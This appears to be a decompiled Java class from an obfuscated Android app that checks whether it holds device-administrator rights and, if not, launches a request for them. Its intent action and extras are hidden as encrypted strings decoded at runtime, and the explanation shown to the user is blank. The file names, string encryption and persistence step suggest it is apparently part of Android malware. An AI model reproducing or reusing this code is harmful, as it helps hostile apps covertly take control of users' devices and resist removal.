package com.sonnokta;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cgoto;
import fddo.Cthrow;

public class p085x extends Activity {
    private static String TAG = "bwolf-p085x";

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        LogUtil.showErrorLog(TAG, "--- onActivityResult ---");
        finish();
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Context applicationContext = getApplicationContext();
        try {
            ComponentName componentName = new ComponentName(this, p053u.class);
            if (!((DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE)).isAdminActive(componentName)) {
                Intent intent = new Intent(Cbreak.fddo("5facd15833c0f6b06e23af73566d3d06ada8295e47aff63cf04d00aa8671cf1a9e379d"));
                intent.putExtra(Cbreak.fddo("5facd15833c0f6b06e23af7352763d1da3e8435a55a2ea3dea5a0da48a60"), componentName);
                intent.putExtra(Cbreak.fddo("5facd15833c0f6b06e23af7352763d1da3e8465b47b4ec20e55708a7827ac7119d"), "");
                intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                startActivityForResult(intent, 100);
                return;
            }
            Cthrow.m154case(applicationContext, Cbreak.fddo("5aa7c3433fcccdff6b3eb633687d2c1b"), Boolean.TRUE);
            finish();
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, "EXC_ADM_ACT", e);
        }
    }
}
